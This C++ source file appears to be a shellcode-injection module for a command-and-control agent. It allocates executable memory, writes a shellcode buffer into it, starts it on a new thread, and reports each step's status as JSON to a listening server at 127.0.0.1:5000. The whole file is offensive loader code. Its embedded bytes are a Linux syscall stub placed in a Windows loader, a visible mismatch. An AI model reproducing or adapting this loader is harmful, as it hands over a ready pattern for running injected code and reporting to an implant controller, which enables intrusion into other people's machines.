#include "http.h"

#pragma comment(lib, "ntdll")
using msgBox = NTSTATUS(NTAPI*)();

int main(int argc, char* argv[]) {
	std::string outData = "";
	//Shellcode (might need to be adjusted)
	//Source: https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
	unsigned char buf[] = "\x31\xdb\xb0\x01\xcd\x80";

	//Allocate memory
	SIZE_T bufSize = sizeof(buf);
	LPVOID shellAddr = VirtualAlloc(NULL, bufSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (shellAddr == NULL) {
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'local_shellcode.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Memory could not be allocated.\'}";
    	makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
		return 0;
	}

	//Write process memory
	HANDLE pHandle = GetCurrentProcess();
	if (pHandle == NULL) {
		//printf("[ERROR] Current process could not be obtained.\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'local_shellcode.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Current process could not be obtained.\'}";
    	makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
	}
	BOOL result = WriteProcessMemory(pHandle, shellAddr, buf, bufSize, NULL);

	if (result == 0) {
		//printf("[ERROR] Could not write process memory.\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'local_shellcode.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not write process memory.\'}";
    	makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
		return 0;
	}
	
	//Run shell using a thread
	HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)shellAddr, NULL, 0, NULL);

	if (tHandle == NULL) {
		//printf("[ERROR] Thread could not be created.\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'local_shellcode.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Thread could not be created.\'}";
    	makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
		return 0;
	}

	//printf("[INFO] Shellcode successfully injected into current process.\n");
	outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'local_shellcode.exe\', \'status\': \'SUCCESS\', \'output\': \'[INFO] Shellcode successfully injected into current process.\'}";
    makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);

	//Cleanup
	CloseHandle(pHandle);
	CloseHandle(tHandle);

	return 0;
}